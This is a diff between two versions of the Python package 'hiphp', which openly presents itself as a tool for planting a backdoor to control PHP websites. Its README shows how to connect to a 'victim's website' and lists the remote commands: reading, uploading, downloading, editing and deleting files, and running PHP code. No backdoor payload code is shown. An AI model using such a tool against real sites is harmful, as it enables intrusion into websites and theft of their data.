# Comparing `tmp/hiphp-0.3.1.tar.gz` & `tmp/hiphp-0.3.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "hiphp-0.3.1.tar", last modified: Mon Mar  6 19:50:29 2023, max compression
+gzip compressed data, was "hiphp-0.3.2.tar", last modified: Sat May 27 15:08:09 2023, max compression
```

## Comparing `hiphp-0.3.1.tar` & `hiphp-0.3.2.tar`

### file list

```diff
@@ -1,24 +1,24 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-03-06 19:50:29.250358 hiphp-0.3.1/
--rw-r--r--   0 runner    (1001) docker     (123)    11572 2023-03-06 19:50:12.000000 hiphp-0.3.1/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)    18323 2023-03-06 19:50:29.250358 hiphp-0.3.1/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)    32312 2023-03-06 19:50:12.000000 hiphp-0.3.1/README.md
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-03-06 19:50:29.250358 hiphp-0.3.1/hiphp/
--rw-r--r--   0 runner    (1001) docker     (123)    21505 2023-03-06 19:50:12.000000 hiphp-0.3.1/hiphp/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)     1165 2023-03-06 19:50:12.000000 hiphp-0.3.1/hiphp/hiphpabout.py
--rw-r--r--   0 runner    (1001) docker     (123)     1221 2023-03-06 19:50:12.000000 hiphp-0.3.1/hiphp/hiphpcoding.py
--rw-r--r--   0 runner    (1001) docker     (123)     2859 2023-03-06 19:50:12.000000 hiphp-0.3.1/hiphp/hiphpeditor.py
--rw-r--r--   0 runner    (1001) docker     (123)     5360 2023-03-06 19:50:12.000000 hiphp-0.3.1/hiphp/hiphphelp.py
--rw-r--r--   0 runner    (1001) docker     (123)    12148 2023-03-06 19:50:12.000000 hiphp-0.3.1/hiphp/hiphplicense.py
--rw-r--r--   0 runner    (1001) docker     (123)     2325 2023-03-06 19:50:12.000000 hiphp-0.3.1/hiphp/hiphplinkextractor.py
--rw-r--r--   0 runner    (1001) docker     (123)     2994 2023-03-06 19:50:12.000000 hiphp-0.3.1/hiphp/hiphplogo.py
--rw-r--r--   0 runner    (1001) docker     (123)     1388 2023-03-06 19:50:12.000000 hiphp-0.3.1/hiphp/hiphpmsgs.py
--rw-r--r--   0 runner    (1001) docker     (123)     9178 2023-03-06 19:50:12.000000 hiphp-0.3.1/hiphp/hiphpphpfunctions.py
--rw-r--r--   0 runner    (1001) docker     (123)      731 2023-03-06 19:50:12.000000 hiphp-0.3.1/hiphp/hiphpversion.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-03-06 19:50:29.250358 hiphp-0.3.1/hiphp.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)    18323 2023-03-06 19:50:29.000000 hiphp-0.3.1/hiphp.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      416 2023-03-06 19:50:29.000000 hiphp-0.3.1/hiphp.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-03-06 19:50:29.000000 hiphp-0.3.1/hiphp.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       41 2023-03-06 19:50:29.000000 hiphp-0.3.1/hiphp.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (123)        6 2023-03-06 19:50:29.000000 hiphp-0.3.1/hiphp.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       74 2023-03-06 19:50:29.250358 hiphp-0.3.1/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)     2942 2023-03-06 19:50:12.000000 hiphp-0.3.1/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-27 15:08:09.503283 hiphp-0.3.2/
+-rw-r--r--   0 runner    (1001) docker     (123)     1088 2023-05-27 15:07:44.000000 hiphp-0.3.2/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)    18343 2023-05-27 15:08:09.503283 hiphp-0.3.2/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)    31514 2023-05-27 15:07:44.000000 hiphp-0.3.2/README.md
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-27 15:08:09.499282 hiphp-0.3.2/hiphp/
+-rw-r--r--   0 runner    (1001) docker     (123)    22992 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1323 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphpabout.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1379 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphpcoding.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3017 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphpeditor.py
+-rw-r--r--   0 runner    (1001) docker     (123)     5047 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphphelp.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1997 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphplicense.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2483 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphplinkextractor.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3218 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphplogo.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1546 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphpmsgs.py
+-rw-r--r--   0 runner    (1001) docker     (123)    10431 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphpphpfunctions.py
+-rw-r--r--   0 runner    (1001) docker     (123)      889 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphpversion.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-27 15:08:09.503283 hiphp-0.3.2/hiphp.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)    18343 2023-05-27 15:08:09.000000 hiphp-0.3.2/hiphp.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      416 2023-05-27 15:08:09.000000 hiphp-0.3.2/hiphp.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-27 15:08:09.000000 hiphp-0.3.2/hiphp.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       51 2023-05-27 15:08:09.000000 hiphp-0.3.2/hiphp.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        6 2023-05-27 15:08:09.000000 hiphp-0.3.2/hiphp.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       74 2023-05-27 15:08:09.503283 hiphp-0.3.2/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)     3310 2023-05-27 15:07:44.000000 hiphp-0.3.2/setup.py
```

### Comparing `hiphp-0.3.1/PKG-INFO` & `hiphp-0.3.2/PKG-INFO`

 * *Files 3% similar despite different names*

```diff
@@ -1,27 +1,28 @@
 Metadata-Version: 2.1
 Name: hiphp
-Version: 0.3.1
+Version: 0.3.2
 Summary: hiphp - free & open source project for create a BackDoor to control PHP-based sites.
 Home-page: UNKNOWN
 Author: yasserbdj96
 Author-email: yasser.bdj96@gmail.com
-License: Apache Software License
+License: MIT License
 Project-URL: Source, https://github.com/yasserbdj96/hiphp
 Project-URL: WebSite, https://yasserbdj96.github.io/hiphp
 Project-URL: Documentation, https://yasserbdj96.github.io/hiphp
 Project-URL: Chat, https://gitter.im/yasserbdj96/hiphp
 Project-URL: Author WebSite, https://yasserbdj96.github.io/
-Keywords: python,windows,macos,linux,docker,cli,php,remoteaccess,website,gui,backdoor,controller,https,declarative,hacking,http-requests,onion,termux,payload,revisioncontrol
+Project-URL: Sponsor, https://github.com/sponsors/yasserbdj96
+Keywords: HIPHP BackDoor,Open-source tool,Remote control,PHP programming,HTTP/HTTPS protocol,POST/GET method,Port 80,File download,File editing,Tor networks,Password protection,Webmasters,Third-party software,User-friendly,Access rights,Directory structure,Flexibility,Security,Compatibility,Content management
 Platform: UNKNOWN
 Classifier: Environment :: Web Environment
 Classifier: Development Status :: 5 - Production/Stable
 Classifier: Intended Audience :: Developers
 Classifier: Natural Language :: English
-Classifier: License :: OSI Approved :: Apache Software License
+Classifier: License :: OSI Approved :: MIT License
 Classifier: Programming Language :: Python
 Classifier: Programming Language :: Python :: 3
 Classifier: Programming Language :: Python :: 3.7
 Classifier: Programming Language :: Python :: 3.8
 Classifier: Programming Language :: Python :: 3.9
 Classifier: Programming Language :: Python :: 3.10
 Classifier: Programming Language :: Python :: 3.11
@@ -29,15 +30,14 @@
 Classifier: Operating System :: Unix
 Classifier: Operating System :: MacOS :: MacOS X
 Classifier: Operating System :: Microsoft :: Windows
 Classifier: Topic :: Software Development :: Build Tools
 Classifier: Topic :: Software Development :: Libraries
 Classifier: Topic :: Software Development :: Libraries :: Python Modules
 Classifier: Topic :: Internet :: WWW/HTTP
-Requires-Python: >=3.x.x
 Description-Content-Type: text/markdown
 License-File: LICENSE
 
 <div align="center">
   <br><img align="center" height="200" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/install/hiphp.png" alt="hiphp by yasserbdj96">
   <h1>Hiphp</h1>
   <strong>Free & Open source project for create a BackDoor to control PHP-based sites.</strong>
@@ -152,14 +152,15 @@
 [✓] <a href="https://pypi.org/project/hexor/">hexor</a><br>
 [✓] <a href="https://pypi.org/project/biglibrary/">biglibrary</a><br>
 [✓] <a href="https://pypi.org/project/tk/">tk</a><br>
 [✓] <a href="https://pypi.org/project/Eel/">eel</a><br>
 [✓] <a href="https://pypi.org/project/readline/">readline</a><br>
 [✓] <a href="https://pypi.org/project/chardet/">chardet</a>
 
+
 <br>
 <h2>Python Package Installation:</h2>
 
 ```bash
 # Install from PYPI:
 ❯ pip install hiphp
 # OR
@@ -170,15 +171,15 @@
 ❯ git clone https://github.com/yasserbdj96/hiphp.git
 # OR
 # Download hiphp from gitlab:
 ❯ git clone https://gitlab.com/yasserbdj96/hiphp.git
 # Go to downloaded folder:
 ❯ cd hiphp
 # install
-❯ pip install -r requirements-pypi.txt
+❯ pip install -r requirements.txt
 ❯ sudo python setup.py install
 
 # Uninstall:
 ❯ pip uninstall hiphp
 ```
 
 <p>click to see <a href="https://asciinema.org/a/a8DVPENs0gGfrPhBmUGRWPYZG">Demo</a></p><br>
@@ -301,23 +302,17 @@
 
 <br>
 <h2>License:</h2>
 <p>The content of this repository is bound by the following <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/LICENSE">LICENSE</a>.</p>
 
 <br>
 <h2>Support:</h2>
-<p>If you like `hiphp` and want to see it improve furthur or want me to create intresting projects , You can buy me a coffee </p>
-<div align="center">
-    <a href="https://ko-fi.com/yasserbdj96">
-        <img src="https://ko-fi.com/img/githubbutton_sm.svg" alt="hiphp by yasserbdj96">
-    </a><br>
-    BTC: bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9<br>
-</div>
-
-<br><br>
+<p>If you enjoy this project and would like to see it continue to improve, or if you would like me to create more interesting projects, please consider <a href="https://github.com/sponsors/yasserbdj96">sponsoring me</a>.</p>
+<br>
+<br>
 
 <p align="center">
   <samp>
     <a href="https://yasserbdj96.github.io/">website</a> .
     <a href="https://github.com/yasserbdj96">github</a> .
     <a href="https://gitlab.com/yasserbdj96">gitlab</a> .
     <a href="https://www.linkedin.com/in/yasserbdj96">linkedin</a> .
@@ -326,12 +321,12 @@
     <a href="https://www.facebook.com/yasserbdj96">facebook</a> .
     <a href="https://www.youtube.com/@yasserbdj96">youtube</a> .
     <a href="https://pypi.org/user/yasserbdj96">pypi</a> .
     <a href="https://hub.docker.com/u/yasserbdj96">docker</a> .
     <a href="https://t.me/yasserbdj96">telegram</a> .
     <a href="https://gitter.im/yasserbdj96/yasserbdj96">gitter</a> .
     <a href="mailto:yasser.bdj96@gmail.com">e-mail</a> .
-    <a href="https://ko-fi.com/yasserbdj96">sponsor</a>
+    <a href="https://github.com/sponsors/yasserbdj96">sponsor</a>
   </samp>
 </p>
```

### Comparing `hiphp-0.3.1/README.md` & `hiphp-0.3.2/README.md`

 * *Files 7% similar despite different names*

```diff
@@ -148,17 +148,17 @@
 [✓] <a href="https://pypi.org/project/chardet/">chardet</a>
 
 <br>
 <h2>Supported Distributions:</h2>
 
 | Distribution   | Version Check | Python Version | Installation | hiphp-cli  | hiphp-desktop | hiphp-tk |
 | :------------: | :-----------: | :------------: | :----------: | :--------: | :-----------: | :------: |
-| Ubuntu         | Last version  | 3.7 --> 3.9    | ✓            |  ✓         | ✓             | ✓        |
-| Windwos        | Last version  | 3.7 --> 3.9    | ✗            |  ✓         | ✓             | ✓        |
-| MacOS          | Last version  | 3.7 --> 3.9    | ✗            |  ✓         | ✓             | ✓        |
+| Ubuntu         | Last version  | 3.7 --> 3.11   | ✓            |  ✓         | ✓             | ✓        |
+| Windwos        | Last version  | 3.7 --> 3.11   | ✗            |  ✓         | ✓             | ✓        |
+| MacOS          | Last version  | 3.7 --> 3.10   | ✗            |  ✓         | ✓             | ✓        |
 | Android-termux | Last version  | 3.7 --> 3.9    | ✓            |  ✓         | ✗             | ✗        |
 | Nethunter      | Last version  | 3.7 --> 3.9    | ✓            |  ✓         | ✓             | ✗        |
 
 <br>
 <h2>Hiphp with Docker:</h2>
 <h4>Docker pull build and run:</h4>
 
@@ -166,15 +166,15 @@
 # Build:
 ❯ docker build -t hiphp:latest .
 
 # Run as CLI:
 ❯ docker run -e KEY="<KEY*>" -e URL="<URL*>" -i -t hiphp:latest
 
 # Run as GUI:
-❯ docker run -e DST="True" -d --rm -p 127.0.0.1:8080:8080 -i -t hiphp:latest
+❯ docker run --rm -p 127.0.0.1:8080:8080 -e DOCKER=True -e DST=True -i -t hiphp:latest
 # Open your web browser and navigate to http://127.0.0.1:8080 to see the default landing page.
 
 # *     = All inputs must be entered.
 # KEY   = The password used for encrypt HIPHP_HOLE_CODE.
 # URL   = Victim website link.
 ```
 
@@ -190,15 +190,15 @@
 # Build:
 ❯ docker build -t docker.io/yasserbdj96/hiphp:latest .
 
 # Run as CLI:
 ❯ docker run -e KEY="<KEY*>" -e URL="<URL*>" -i -t docker.io/yasserbdj96/hiphp:latest
 
 # Run as GUI:
-❯ docker run -e DST="True" -d --rm -p 127.0.0.1:8080:8080 -i -t docker.io/yasserbdj96/hiphp:latest
+❯ docker run --rm -p 127.0.0.1:8080:8080 -e DOCKER=True -e DST=True -i -t docker.io/yasserbdj96/hiphp:latest
 # Open your web browser and navigate to http://127.0.0.1:8080 to see the default landing page.
 
 # *     = All inputs must be entered.
 # KEY   = The password used for encrypt HIPHP_HOLE_CODE.
 # URL   = Victim website link.
 ```
 
@@ -214,15 +214,15 @@
 # Build:
 ❯ docker build -t ghcr.io/yasserbdj96/hiphp:latest .
 
 # Run as CLI:
 ❯ docker run -e KEY="<KEY*>" -e URL="<URL*>" -i -t ghcr.io/yasserbdj96/hiphp:latest
 
 # Run as GUI:
-❯ docker run -e DST="True" -d --rm -p 127.0.0.1:8080:8080 -i -t ghcr.io/yasserbdj96/hiphp:latest
+❯ docker run --rm -p 127.0.0.1:8080:8080 -e DOCKER=True -e DST=True -i -t ghcr.io/yasserbdj96/hiphp:latest
 # Open your web browser and navigate to http://127.0.0.1:8080 to see the default landing page.
 
 # *     = All inputs must be entered.
 # KEY   = The password used for encrypt HIPHP_HOLE_CODE.
 # URL   = Victim website link.
 ```
 
@@ -243,15 +243,15 @@
 ❯ git clone https://github.com/yasserbdj96/hiphp.git
 # OR
 # Download hiphp from gitlab:
 ❯ git clone https://gitlab.com/yasserbdj96/hiphp.git
 # Go to downloaded folder:
 ❯ cd hiphp
 # install
-❯ pip install -r requirements-pypi.txt
+❯ pip install -r requirements.txt
 ❯ sudo python setup.py install
 
 # Uninstall:
 ❯ pip uninstall hiphp
 ```
 
 <br>
@@ -274,22 +274,23 @@
 # If you encounter problems with installation and operation, please repeat the process by giving root permission.
 ❯ bash install.sh -i
 ❯ hiphp
 
 # Update:
 ❯ bash install.sh -up
 
-# Usage:
-#      hiphp [OPTION]
-#      hiphp --help                --> hiphp cli help.
-#      hiphp --geth [KEY] [URL]    --> Get the HIPHP_HOLE_CODE Encrypted by your [KEY].
-#      hiphp [KEY] [URL]           --> Connect to the victim's website (CLI) Mode.
-#      hiphp --tk                  --> Run hiphp with 'hiphp-tk' (GUI) Mode.
-#      hiphp --dst                 --> Run hiphp with 'hiphp-desktop' (GUI) Mode.
-#      hiphp --version             --> Get the version number you are working with.
+# Usage: hiphp [OPTION]
+
+# Examples:
+#         hiphp --help                  # Show CLI help for hiphp.
+#         hiphp --geth [KEY] [URL]      # Retrieve the HIPHP_HOLE_CODE encrypted by your [KEY].
+#         hiphp [KEY] [URL]             # Connect to the victim's website in CLI mode.
+#         hiphp --tk                    # Run hiphp in 'hiphp-tk' (GUI) mode.
+#         hiphp --dst                   # Run hiphp in 'hiphp-desktop' (GUI) mode.
+#         hiphp --version               # Check the current version number.
 
 # Uninstall:
 ❯ bash install.sh -u
 ```
 
 <br>
 <h4>Termux Installation:</h4>
@@ -310,20 +311,21 @@
 # Install:
 ❯ bash install.sh -ti
 ❯ hiphp
 
 # Update:
 ❯ bash install.sh -tup
 
-# Usage:
-#      hiphp [OPTION]
-#      hiphp --help                --> hiphp cli help.
-#      hiphp --geth [KEY] [URL]    --> Get the HIPHP_HOLE_CODE Encrypted by your [KEY].
-#      hiphp [KEY] [URL]           --> Connect to the victim's website (CLI) Mode.
-#      hiphp --version             --> Get the version number you are working with.
+# Usage: hiphp [OPTION]
+
+# Examples:
+#         hiphp --help                  # Show CLI help for hiphp.
+#         hiphp --geth [KEY] [URL]      # Retrieve the HIPHP_HOLE_CODE encrypted by your [KEY].
+#         hiphp [KEY] [URL]             # Connect to the victim's website in CLI mode.
+#         hiphp --version               # Check the current version number.
 
 # Uninstall:
 ❯ bash install.sh -tu
 ```
 
 <br>
 <h2>Run without installation:</h2>
@@ -341,115 +343,103 @@
 
 # install requirements:
 ❯ pip install -r requirements.txt
 ❯ pip install -r hiphp-linux/requirements-linux.txt #for linux os.
 ❯ pip install -r hiphp-win/requirements-win.txt #for windows os.
 
 # default run on any os:
-❯ python run.py <KEY> <URL>
+❯ python main.py --KEY="<KEY*>" --URL="<URL*>"
 
 # Run with Makefile:
-❯ make run arg="cli" url="<URL*>" key="<KEY*>"
+❯ make ARGUMENTS="--KEY='<KEY*>' --URL='<URL*>'" run
 
 # For linux:
 ❯ cd hiphp-linux
-❯ bash hiphp-cli.sh "<KEY*>" "<URL*>"
+❯ bash hiphp-cli.sh --KEY="<KEY*>" --URL="<URL*>"
 
 # For Windows:
 # Do not forget to modify the "config.ini" file or use the following command:
 # > python -c "import sys; open('config.ini','w+').write('python_default_path='+sys.executable)"
 # OR Run 'hiphp-win\config-configure.py'.
 ❯ cd hiphp-win
-❯ hiphp-cli.bat "<KEY*>" "<URL*>"
+❯ hiphp-cli.bat --KEY="<KEY*>" --URL="<URL*>"
 
 ```
 
 <br>
 <h5>Help for hiphp-cli:</h5>
 
 ```
-hiphp Commands :
-════════════════
-  Command                            Description
-  -------                            -----------
-[OPTIONS]
-
-  --help, help                       ─> # Display this help.
-  --help [ACTIONS], help [ACTIONS]   ─> # Help for a specific command.
-  --geth, geth                       ─> # Get the hole Code, "HIPHP_HOLE_CODE" It has the same purpose.
-  --phpinfo, phpinfo                 ─> # Some information about the server.
-  --cls, cls                         ─> # Clear console.
-  --exit, exit                       ─> # Exit this console.
+Commands:
 
-[ACTIONS]
+  --help, help                       # Display this help.
+  --help [ACTIONS], help [ACTIONS]   # Help for a specific command.
+  --geth, geth                       # Get the HIPHP_HOLE_CODE (same purpose as --geth).
+  --phpinfo, phpinfo                 # Display information about the server.
+  --cls, cls                         # Clear the console.
+  --exit, exit                       # Exit the console.
 
-  --ls, ls                           ─> # List information about the FILEs (the current directory by default).
+Actions:
+
+  --ls, ls                           # List files and folders (current directory by default).
   Usage: --ls [OPTION] [PATH], ls [OPTION] [PATH]
-  Mandatory arguments to long options:
-    --ls                             ─> # Get a list of all files and folders from the current directory.
-    --ls [PATH]                      ─> # Get a list of all files and folders from a specified directory.
-    --ls -all                        ─> # Get a list of all files, folders and subfolders from the current directory.
-    --ls -all [PATH]                 ─> # Get a list of all files, folders and subfolders from a specified directory.
+    --ls                             # List all files and folders in the current directory.
+    --ls [PATH]                      # List all files and folders in the specified directory.
+    --ls -all                        # List all files, folders, and subfolders in the current directory.
+    --ls -all [PATH]                 # List all files, folders, and subfolders in the specified directory.
 
-  --cat, cat                         ─> # Concatenate FILE to standard output.
+  --cat, cat                         # Concatenate a file to standard output.
   Usage: --cat [FILE_PATH]
 
-  --set, set                         ─> # Create a code that is always saved on during work.
+  --set, set                         # Create a code snippet that is always saved during work.
   Usage: --set [PHP_CODE]
-  You can return the initial value with "--dset" or "dset".
+  To reset to the initial value, use "--dset" or "dset".
 
-  --cd, cd                           ─> # Change directory.
+  --cd, cd                           # Change directory.
   Usage: --cd [PATH]
 
-  --rf, rf, run                      ─> # Run code from file.
+  --rf, rf, run                      # Run code from a file.
   Usage: --rf [FILE_PATH] [VARIABLES]
-  Mandatory arguments to long options:
-    --rf [FILE_PATH]                 ─> # Run code from file.
-    --rf [FILE_PATH] [VARIABLES]     ─> # Run code from file with variables, EX: --rf example.php var==hello
+    --rf [FILE_PATH]                 # Run code from a file.
+    --rf [FILE_PATH] [VARIABLES]     # Run code from a file with variables (e.g., --rf example.php var==hello).
   
-  --up, up, upload                   ─> # Upload a file.
+  --up, up, upload                   # Upload a file.
   Usage: --up [FILE_PATH] [PATH]
-  Mandatory arguments to long options:
-    --up [FILE_PATH]                 ─> # Upload a file to the current directory.
-    --up [FILE_PATH] [PATH]          ─> # Upload a file to a specified directory.
+    --up [FILE_PATH]                 # Upload a file to the current directory.
+    --up [FILE_PATH] [PATH]          # Upload a file to a specified directory.
 
-  --down, down, download             ─> # download a file.
+  --down, down, download             # Download a file.
   Usage: --down [-f/-d] [FILE/DIR_PATH] [OUT_PATH]
-  Mandatory arguments to long options:
-    --down -f [FILE_PATH]            ─> # Download a file to the current directory.
-    --down -f [FILE_PATH] [OUT_PATH] ─> # Download file to a specified directory.
-    --down -d [DIR_PATH]             ─> # Download a folder to the current directory.
-    --down -d [DIR_PATH] [OUT_PATH]  ─> # Download folder to a specified directory.
-    --down -all                      ─> # Download all files to the current directory.
-    --down -all [OUT_PATH]           ─> # Download all files to a specified directory.
+    --down -f [FILE_PATH]            # Download a file to the current directory.
+    --down -f [FILE_PATH] [OUT_PATH] # Download a file to a specified directory.
+    --down -d [DIR_PATH]             # Download a folder to the current directory.
+    --down -d [DIR_PATH] [OUT_PATH]  # Download a folder to a specified directory.
+    --down -all                      # Download all files to the current directory.
+    --down -all [OUT_PATH]           # Download all files to a specified directory.
 
-  --zip, zip                         ─> # Compress a directory.
+  --zip, zip                         # Compress a directory.
   Usage: --zip [DIR_PATH]
-  Mandatory arguments to long options:
-    --zip                            ─> # Compress the current directory.
-    --zip [DIR_PATH]                 ─> # Compress a specific directory.
+    --zip                            # Compress the current directory.
+    --zip [DIR_PATH]                 # Compress a specific directory.
 
-  --edt, edt, edit                   ─> # To edit files.
+  --edt, edt, edit                   # Edit files.
   Usage: --edt [FILE_PATH]
-  Mandatory arguments to long options:
-    CTRL+q                           ─> # To exit.
-    CTRL+s                           ─> # To save.
+    CTRL+q                           # Exit the editor.
+    CTRL+s                           # Save the changes.
 
-  --rm, rm, delete                   ─> # To delete files and folders.
+  --rm, rm, delete                   # Delete files and folders.
   Usage: --rm [-f/-d] [FILE/DIR_PATH]
-  Mandatory arguments to long options:
-    --rm -f [FILE_PATH]              ─> # Delete a file.
-    --rm -d [DIR_PATH]               ─> # Delete a folder.
-
-[ABOUT]
-
-  --update, update                   ─> # check for updates.
-  --license, license                 ─> # This project license.
-  --about, about                     ─> # About this project.
-  --version, version                 ─> # Get the version number you are working with.
+    --rm -f [FILE_PATH]              # Delete a file.
+    --rm -d [DIR_PATH]               # Delete a folder.
+
+About:
+  --update, update                   # Check for updates.
+  --license, license                 # View the project license.
+  --about, about                     # About this project.
+  --version, version                 # Get the current version number.
 ```
 
 <br>
 <h4>Run with hiphp-desktop:</h4>
 
 ```bash
 # Download hiphp from github:
@@ -459,37 +449,35 @@
 ❯ git clone https://gitlab.com/yasserbdj96/hiphp.git
 
 # Go to downloaded folder:
 ❯ cd hiphp
 
 # install requirements:
 ❯ pip install -r requirements.txt
-❯ pip install -r hiphp-desktop/requirements-dst.txt
 ❯ pip install -r hiphp-linux/requirements-linux.txt #for linux os.
 ❯ pip install -r hiphp-win/requirements-win.txt #for windows os.
 
 # run with hiphp-desktop tool:
-❯ cd hiphp-desktop
-❯ python main.py local
+❯ python main.py --DST
 
 # Run with Makefile:
-❯ make run arg="dst"
+❯ make ARGUMENTS="--DST" run
 # Open your web browser and navigate to http://127.0.0.1:8080 to see the default landing page.
 
 # For Linux:
 ❯ cd hiphp-linux
-❯ bash run-hiphp-desktop.sh
+❯ bash hiphp-desktop.sh
 # Open your web browser and navigate to http://127.0.0.1:8080 to see the default landing page.
 
 # For Windows:
 # Do not forget to modify the "config.ini" file or use the following command:
 # > python -c "import sys; open('config.ini','w+').write('python_default_path='+sys.executable)"
 # OR Run 'hiphp-win\config-configure.py'.
 ❯ cd hiphp-win
-❯ run-hiphp-desktop.bat
+❯ hiphp-desktop.bat
 # Open your web browser and navigate to http://127.0.0.1:8080 to see the default landing page.
 
 ```
 
 <br>
 <h5>Run hiphp-desktop In Colab:</h5>
 <a target="_blank" href="https://colab.research.google.com/github/yasserbdj96/hiphp/blob/main/hiphp.ipynb">Open hiphp-desktop In Colab</a>
@@ -505,26 +493,24 @@
 ❯ git clone https://gitlab.com/yasserbdj96/hiphp.git
 
 # Go to downloaded folder:
 ❯ cd hiphp
 
 # install requirements:
 ❯ pip install -r requirements.txt
-❯ pip install -r hiphp-tk/requirements-tk.txt
 ❯ pip install -r hiphp-linux/requirements-linux.txt #for linux os.
 ❯ pip install -r hiphp-win/requirements-win.txt #for windows os.
 
 # run with hiphp-tk tool:
-❯ cd hiphp-tk
-❯ python main.py
+❯ python main.py --TK
 
 # Run with Makefile:
-❯ make run arg="tk"
+❯ make ARGUMENTS="--TK" run
 # OR
-❯ make run arg="tk" url="<URL>" key="<KEY>"
+❯ make ARGUMENTS="--TK --KEY='<KEY>' --URL='<URL>'" run
 
 # For Linux:
 ❯ cd hiphp-linux
 ❯ bash run-hiphp-tk.sh
 
 # For Windows:
 # Do not forget to modify the "config.ini" file or use the following command:
@@ -685,23 +671,17 @@
 
 <br>
 <h2>License:</h2>
 <p>The content of this repository is bound by the following <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/LICENSE">LICENSE</a>.</p>
 
 <br>
 <h2>Support:</h2>
-<p>If you like `hiphp` and want to see it improve furthur or want me to create intresting projects , You can buy me a coffee </p>
-<div align="center">
-    <a href="https://ko-fi.com/yasserbdj96">
-        <img src="https://ko-fi.com/img/githubbutton_sm.svg" alt="hiphp by yasserbdj96">
-    </a><br>
-    BTC: bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9<br>
-</div>
-
-<br><br>
+<p>If you enjoy this project and would like to see it continue to improve, or if you would like me to create more interesting projects, please consider <a href="https://github.com/sponsors/yasserbdj96">sponsoring me</a>.</p>
+<br>
+<br>
 
 <p align="center">
   <samp>
     <a href="https://yasserbdj96.github.io/">website</a> .
     <a href="https://github.com/yasserbdj96">github</a> .
     <a href="https://gitlab.com/yasserbdj96">gitlab</a> .
     <a href="https://www.linkedin.com/in/yasserbdj96">linkedin</a> .
@@ -710,10 +690,10 @@
     <a href="https://www.facebook.com/yasserbdj96">facebook</a> .
     <a href="https://www.youtube.com/@yasserbdj96">youtube</a> .
     <a href="https://pypi.org/user/yasserbdj96">pypi</a> .
     <a href="https://hub.docker.com/u/yasserbdj96">docker</a> .
     <a href="https://t.me/yasserbdj96">telegram</a> .
     <a href="https://gitter.im/yasserbdj96/yasserbdj96">gitter</a> .
     <a href="mailto:yasser.bdj96@gmail.com">e-mail</a> .
-    <a href="https://ko-fi.com/yasserbdj96">sponsor</a>
+    <a href="https://github.com/sponsors/yasserbdj96">sponsor</a>
   </samp>
 </p>
```

### Comparing `hiphp-0.3.1/hiphp/__init__.py` & `hiphp-0.3.2/hiphp/__init__.py`

 * *Files 6% similar despite different names*

```diff
@@ -1,19 +1,21 @@
 #!/usr/bin/env python
 # coding:utf-8
-#   |                                                          |
-# --+----------------------------------------------------------+--
-#   |   Code by : yasserbdj96                                  |
-#   |   Email   : yasser.bdj96@gmail.com                       |
-#   |   Github  : https://github.com/yasserbdj96               |
-#   |   BTC     : bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9   |
-# --+----------------------------------------------------------+--  
-#   |        all posts #yasserbdj96 ,all views my own.         |
-# --+----------------------------------------------------------+--
-#   |                                                          |
+#   |                                                         |   #
+# --+---------------------------------------------------------+-- #
+#   |    Code by: yasserbdj96                                 |   #
+#   |    Email: yasser.bdj96@gmail.com                        |   #
+#   |    GitHub: github.com/yasserbdj96                       |   #
+#   |    Sponsor: github.com/sponsors/yasserbdj96             |   #
+#   |    BTC: bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9      |   #
+#   |                                                         |   #
+#   |    All posts with #yasserbdj96                          |   #
+#   |    All views are my own.                                |   #
+# --+---------------------------------------------------------+-- #
+#   |                                                         |   #
 
 #START{
 from hiphp.hiphpversion import __version__
 from hiphp.hiphpcoding import rot13,tobase64,tomd5
